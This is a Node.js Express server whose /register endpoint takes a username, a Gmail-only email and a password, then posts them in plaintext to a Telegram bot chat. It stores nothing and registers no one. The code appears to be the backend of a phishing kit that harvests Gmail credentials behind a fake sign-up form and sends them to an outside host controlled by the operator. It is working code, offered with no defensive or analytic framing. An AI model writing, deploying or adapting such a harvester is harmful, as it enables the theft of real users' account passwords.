// server.js
import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch'; // if using Node 18+, you can use global fetch.

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve the static HTML file (index.html) from same folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive registration data
app.post('/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    if(!username || !email || !password){
      return res.status(400).json({ error: 'Missing fields' });
    }

    // Basic server-side validation (example)
    if(!/^[^@]+@gmail\\.com$/i.test(email)){
      return res.status(400).json({ error: 'Invalid Gmail' });
    }

    // Prepare message (customize as needed)
    const message = `📝 New Registration\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;

    const BOT_TOKEN = process.env.BOT_TOKEN; // e.g. 8003870361:AAE...
    const CHAT_ID = process.env.CHAT_ID;     // e.g. 7597265569

    if(!BOT_TOKEN || !CHAT_ID){
      return res.status(500).json({ error: 'Server not configured (missing BOT_TOKEN/CHAT_ID)' });
    }

    const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const resp = await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });

    const tgResult = await resp.json();
    if(!tgResult.ok){
      console.error('Telegram error', tgResult);
      return res.status(502).json({ error: 'Telegram API error', details: tgResult });
    }

    return res.json({ message: 'Registration sent to Telegram' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));